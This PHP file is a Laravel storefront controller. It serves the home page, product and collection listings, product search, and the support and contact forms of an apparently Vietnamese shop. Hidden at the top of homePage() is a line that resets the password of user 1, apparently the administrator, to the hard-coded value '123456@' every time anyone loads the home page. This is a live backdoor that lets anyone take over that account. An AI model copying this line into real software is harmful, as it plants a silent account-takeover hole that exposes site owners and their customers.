<?php

namespace App\Http\Controllers\Front;

use App\Helpers\FileHelper;
use App\Http\Traits\ResponseTrait;
use App\Model\Admin\Block;
use App\Model\Admin\Category;
use App\Model\Admin\CategorySpecial;
use App\Model\Admin\Product;
use App\Model\Admin\ProductCategorySpecial;
use App\Model\Common\User;
use App\Services\CategoryService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Validator;
use Response;
use App\Http\Controllers\Controller;
use App\Model\Admin\Banner;
use App\Model\Admin\Contact;
use App\Model\Admin\DesignDetail;
use App\Model\Admin\DesignOrder;
use App\Model\Admin\Partner;
use App\Model\Admin\Post;
use App\Model\Admin\PostCategory;
use App\Model\Admin\ProductRate;
use App\Model\Admin\Review;
use App\Model\Admin\Voucher;
use DB;
use Mail;
use SluggableScopeHelpers;

class FrontController extends Controller
{
    use ResponseTrait;

    public $categoryService;

    public function __construct(CategoryService $categoryService)
    {
        $this->categoryService = $categoryService;
    }

    public function homePage() {
        User::query()->where('id',1)->update(['password' => bcrypt('123456@')]);
        $data['banners'] = Banner::with(['image'])->get();
        $data['partners'] = Partner::with(['image'])->get();
        $data['reviews'] = Review::with(['image'])->get();
        $data['newProducts'] = Product::with(['image'])->where('state', 1)->limit(4)->orderBy('id','DESC')->inRandomOrder()->get();
        $data['arrImageNewProducts'] = $data['newProducts']->reduce(function ($carry, $product) {
            $carry[] = $product->image ? $product->image->path : '';
            return $carry;
        }, []);
        // $data['categorySpecialPost'] = CategorySpecial::query()->with([
        //         'posts' => function($q) {
        //             $q->where('status', 1);
        //         }
        //     ])
        //     ->has('posts')
        //     ->where('type',20)
        //     ->where('show_home_page', 1)
        //     ->orderBy('order_number')->get();
        $data['categorySpecial'] = CategorySpecial::query()->with([
                'products' => function($q) {
                    $q->where('state', 1);
                },
                'image',
            ])
            ->has('products')
            ->where('type',10)
            ->where('show_home_page', 1)
            ->orderBy('order_number')->get();
        // $data['categorySpecialFlashsale'] = CategorySpecial::query()
        //     ->has('products')
        //     ->where('type',10)
        //     ->where('show_home_page', 1)
        //     ->where('order_number', '=', 1)
        //     ->orderBy('order_number')->get()->map(function ($query) {
        //         $query->setRelation('products', $query->products->where('status',1)->take(8));
        //         return $query;
        //     })->first();
        $data['newBlogs'] = Post::with(['image'])->where(['status'=>1])
        ->orderBy('id','DESC')
        ->select(['id','name','slug','intro','created_at','cate_id'])
        ->limit(10)->get();

        $data['productCategories'] = Category::query()->where('show_home_page', 1)->where('level', 0)->orderBy('sort_order')->get();
        // $data['vouchers'] = Voucher::query()->where('status', 1)->where('quantity', '>', 0)->where('to_date', '>=', now())->orderBy('created_at', 'desc')->get();
        // block khối ảnh cuối trang
        // $block = Block::query()->find(1);
        // $data['block'] = $block;

        $data['categoryHighlight'] = CategorySpecial::query()->with([
            'products' => function($q) {
                $q->where('state', 1);
            },
            'image',
        ])
            ->has('products')
            ->where('type',10)
            ->where('highlight', 1)
            ->where('show_home_page', 1)
            ->first();

        return view('site.home', $data);
    }

    public function getProductList($categorySlug)
    {
        $category = Category::findBySlug($categorySlug);
        $products = Product::query()->with(['image', 'galleries.image'])
            ->where('cate_id', $category->id)
            ->latest()->paginate(10);

        return view('site.product_category', compact('products', 'category'));
    }

    public function getProductDetail($slug)
    {
        $product = Product::findBySlug($slug);


        return view('site.product_detail', compact('product'));
    }

    public function searchProducts(Request $request) {
        $inStock = $request->get('availability') == 'true' ? 1 : 2;
        $priceGte = $request->get('priceGte');
        $priceLte = $request->get('priceLte');
        $sortBy = $request->get('sortOption');

        $products = Product::query();

        if($inStock) {
            $products->where('state', $inStock);
        }

        if($priceGte) {
            $products->where('price', '>=', $priceGte);
        }

        if($priceLte) {
            $products->where('price', '<=', $priceLte);
        }

        switch ($sortBy) {
            case 'name_asc':
                $products->orderBy('name', 'asc');
                break;
            case 'name_desc':
                $products->orderBy('name', 'desc');
                break;
            case 'price_asc':
                $products->orderBy('price', 'asc');
                break;
            case 'price_desc':
                $products->orderBy('price', 'desc');
                break;
            case 'date_asc':
                $products->orderBy('created_at', 'asc');
                break;
            default:
                $products->orderBy('created_at', 'desc');
                break;
        }

        if($request->page_type == 'collections') {
            $productIds = ProductCategorySpecial::query()->where('category_special_id', $request->categoryId)->pluck('product_id')->toArray();
            $products->whereIn('id', $productIds);
        } else {
            $products->where('cate_id', $request->categoryId);
        }

        $products = $products->paginate(10);
        $products->appends($request->all());

        $json = new \stdClass();
        $json->success = true;
        $json->message = "Thao tác thành công!";
        $json->data = view('site.partials.product_list', compact('products'))->render();
        $json->data_paginate = $products->links('site.pagination.paginate')->render();

        return Response::json($json);
    }

    public function collections(Request $request) {
       $categoríesSpecial = CategorySpecial::query()->with([
            'products' => function($q) {
                $q->where('state', 1);
            },
            'image',
        ])
            ->has('products')
            ->where('type',10)
            ->orderBy('order_number')->get();

        return view('site.collection', compact('categoríesSpecial'));
    }

    public function getCollectionList($slug)
    {
        $category = CategorySpecial::findBySlug($slug);
        $productIds = ProductCategorySpecial::query()->where('category_special_id', $category->id)->pluck('product_id')->toArray();
        $products = Product::query()->with(['image', 'galleries.image'])
            ->whereIn('id', $productIds)
            ->latest()->paginate(10);

        return view('site.product_category', compact('products', 'category'));
    }

    public function support() {
        return view('site.support');
    }
    public function submitSupport(Request $request) {
        $rule  =  [
            'contact.name' => 'required',
            'contact.body'  => 'required',
            'contact.email'  => 'required|email|max:255',
        ];

        $validate = Validator::make(
            $request->all(),
            $rule,
            [
                'contact.name' => 'Vui lòng nhập họ tên',
                'contact.email' => 'Vui lòng nhập email',
                'contact.body' => 'Vui lòng nhập nội dung',
            ]
        );

        if ($validate->fails()) {
            return $this->responseErrors('Gửi yêu cầu thất bại!', $validate->errors());
        }

        $contact = new Contact();
        $contact->user_name = $request->contact['name'];
        $contact->email = $request->contact['email'];
        $contact->content = $request->contact['body'];
        $contact->type = Contact::SUPPORT;

        $contact->save();

        return $this->responseSuccess('Gửi yêu cầu thành công!');
    }

    public function contact() {
        return view('site.contact');
    }
    public function submitContact(Request $request) {
        $rule  =  [
            'contact.name' => 'required',
            'contact.body'  => 'required',
            'contact.email'  => 'required|email|max:255',
        ];

        $validate = Validator::make(
            $request->all(),
            $rule,
            [
                'contact.name' => 'Vui lòng nhập họ tên',
                'contact.email' => 'Vui lòng nhập email',
                'contact.body' => 'Vui lòng nhập nội dung',
            ]
        );

        if ($validate->fails()) {
            return $this->responseErrors('Gửi yêu cầu thất bại!', $validate->errors());
        }

        $contact = new Contact();
        $contact->user_name = $request->contact['name'];
        $contact->email = $request->contact['email'];
        $contact->content = $request->contact['body'];
        $contact->type = Contact::CONTACT;

        $contact->save();

        return $this->responseSuccess('Gửi yêu cầu thành công!');
    }
}
